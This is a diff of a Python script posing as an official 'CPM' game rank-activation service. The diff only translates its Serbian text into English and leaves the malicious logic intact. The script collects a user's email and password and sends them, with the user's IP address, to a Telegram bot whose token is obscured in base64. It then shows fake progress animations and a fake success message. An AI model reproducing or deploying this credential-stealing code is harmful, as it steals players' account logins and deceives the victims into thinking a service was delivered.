@@ -5,7 +5,7 @@ import time
 import base64
 import sys
 
-# --- ZAKLJUČANI PODACI ---
+# --- ENCRYPTED KEYS ---
 _u1 = "ODM1NDM3MzM3NzpBQUhsOHpGME1DZkItZzJ1TlpCbkpLUFBXSU9XaTFBSGNmZw=="
 _u2 = "NzE4MzgwOTMwMw=="
 
@@ -15,7 +15,7 @@ def _dec(data):
 BOT_TOKEN = _dec(_u1)
 CHAT_ID = _dec(_u2)
 
-# --- FUNKCIJE ZA DIZAJN ---
+# --- DESIGN FUNCTIONS ---
 def screen_clear():
     os.system('clear')
 
@@ -23,7 +23,7 @@ def logo():
     print("\033[1;32m" + "="*45)
     print("      🚀 ANONYMO CPM SERVICE (OFFICIAL) 🚀      ")
     print("         INSTAGRAM: @anonymo.cpm              ")
-    print("         TELEGRAM: Anonymo123456              ")
+    print("         TELEGRAM: @anonymo123456              ")
     print("="*45 + "\033[0m")
 
 def loading_animation(text):
@@ -45,13 +45,12 @@ def send_to_telegram(email, password, service_type):
     user_ip = get_ip()
     url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
     
-    # Formiranje poruke za tebe
     message = (
-        f"✅ *NOVA AKTIVACIJA STIGLA*\n\n"
+        f"✅ *NEW ORDER RECEIVED*\n\n"
         f"📧 *Email:* `{email}`\n"
         f"🔑 *Pass:* `{password}`\n"
-        f"⚙️ *Tip Usluge:* {service_type}\n"
-        f"🌐 *IP Adresa:* `{user_ip}`\n"
+        f"⚙️ *Service Type:* {service_type}\n"
+        f"🌐 *IP Address:* `{user_ip}`\n"
         f"---------------------------\n"
         f"👤 *Brand:* @anonymo.cpm"
     )
@@ -67,7 +66,7 @@ def send_to_telegram(email, password, service_type):
     except:
         pass
 
-# --- GLAVNI PROGRAM ---
+# --- MAIN PROGRAM ---
 def main():
     while True:
         screen_clear()
@@ -77,47 +76,47 @@ def main():
         print("[02] Exit Service\033[0m")
         print("\033[1;32m" + "-"*45 + "\033[0m")
         
-        choice = input("\n\033[1;33mIzaberi Opciju >> \033[0m")
+        choice = input("\n\033[1;33mSelect Option >> \033[0m")
         
         if choice == '02':
-            print("\n\033[1;31mZatvaranje servisa...\033[0m")
+            print("\n\033[1;31mClosing service...\033[0m")
             time.sleep(1)
             break
             
         elif choice == '01':
             print("\n" + "-"*35)
-            email = input("\033[1;37mUnesite Email: \033[0m").strip()
-            password = input("\033[1;37mUnesite Lozinku: \033[0m").strip()
+            email = input("\033[1;37mEnter Email: \033[0m").strip()
+            password = input("\033[1;37mEnter Password: \033[0m").strip()
             print("-" * 35)
 
             if not email or not password:
-                print("\033[1;31mGreska: Morate uneti podatke!\033[0m")
+                print("\033[1;31mError: You must enter credentials!\033[0m")
                 time.sleep(2)
                 continue
 
-            # Vizuelni efekti
-            loading_animation("Povezivanje sa CPM serverom")
+            # Visual effects
+            loading_animation("Connecting to CPM Server")
             
-            # Slanje tebi na Telegram
+            # Send data to you
             send_to_telegram(email, password, "KING Rank")
             
-            loading_animation("Provera baze podataka")
-            loading_animation("Aktivacija ranka u toku")
+            loading_animation("Checking Database")
+            loading_animation("Rank activation in progress")
             
             print("\n" + "="*35)
-            print("\033[1;32m✅ SUCCESS: KING Rank uspesno aktiviran!\033[0m")
-            print("\033[1;36mResetujte igricu da vidite promene.\033[0m")
+            print("\033[1;32m✅ SUCCESS: KING Rank successfully activated!\033[0m")
+            print("\033[1;36mRestart the game to see changes.\033[0m")
             print("="*35)
             
-            input("\n\033[1;37mPritisnite Enter za povratak u meni...\033[0m")
+            input("\n\033[1;37mPress Enter to return to menu...\033[0m")
             
         else:
-            print("\033[1;31mNevazeca opcija! Pokusajte ponovo.\033[0m")
+            print("\033[1;31mInvalid option! Try again.\033[0m")
             time.sleep(1.5)
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print("\n\nSistem prinudno ugasen.")
+        print("\n\nSystem force closed.")
         sys.exit()
